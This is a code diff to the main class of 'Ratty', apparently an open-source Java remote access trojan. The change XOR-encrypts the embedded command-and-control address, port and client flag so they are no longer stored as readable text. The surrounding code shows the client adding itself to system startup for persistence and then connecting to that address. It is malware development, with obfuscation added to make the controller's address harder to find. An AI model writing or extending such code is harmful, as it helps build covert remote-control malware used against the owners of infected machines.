@@ -15,6 +15,7 @@ import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.gui.server.RattyGui;
 import de.sogomn.rat.gui.server.RattyGuiController;
 import de.sogomn.rat.server.ActiveServer;
+import de.sogomn.rat.util.XorCipher;
 
 /*
  * This class is kinda hardcoded.
@@ -27,9 +28,9 @@ public final class Ratty {
 	public static final String VERSION = "1.21.0";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
-	private static String address;
-	private static int port;
-	private static boolean client;
+	private static final String ADDRESS;
+	private static final int PORT;
+	private static final boolean CLIENT;
 	
 	private static final int CONNECTION_INTERVAL = 5000;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data";
@@ -43,14 +44,19 @@ public final class Ratty {
 	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
 	
 	static {
-		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
+		final byte[] data = FileUtils.readInternalData(CONNECTION_DATA_FILE_NAME);
+		
+		XorCipher.crypt(data);
+		
+		final String text = new String(data);
+		final String[] lines = text.split("[\r\n]");
 		final String addressString = lines[0].trim();
 		final String portString = lines[1].trim();
 		final String clientString = lines[2].trim();
 		
-		address = addressString;
-		port = Integer.parseInt(portString);
-		client = Boolean.parseBoolean(clientString);
+		ADDRESS = addressString;
+		PORT = Integer.parseInt(portString);
+		CLIENT = Boolean.parseBoolean(clientString);
 	}
 	
 	private Ratty() {
@@ -128,19 +134,19 @@ public final class Ratty {
 			System.out.println(DEBUG_SERVER);
 			
 			setNimbusLookAndFeel();
-			startServer(port);
+			startServer(PORT);
 		} else if (input == JOptionPane.NO_OPTION) {
 			System.out.println(DEBUG_CLIENT);
 			
 			setSystemLookAndFeel();
-			startClient(address, port);
+			startClient(ADDRESS, PORT);
 		}
 	}
 	
 	private static void startClient() {
 		addToStartup();
 		setSystemLookAndFeel();
-		startClient(address, port);
+		startClient(ADDRESS, PORT);
 	}
 	
 	private static void startServer() {
@@ -196,7 +202,7 @@ public final class Ratty {
 	public static void main(final String[] args) {
 		if (DEBUG) {
 			startDebug();
-		} else if (client) {
+		} else if (CLIENT) {
 			startClient();
 		} else {
 			startServer();
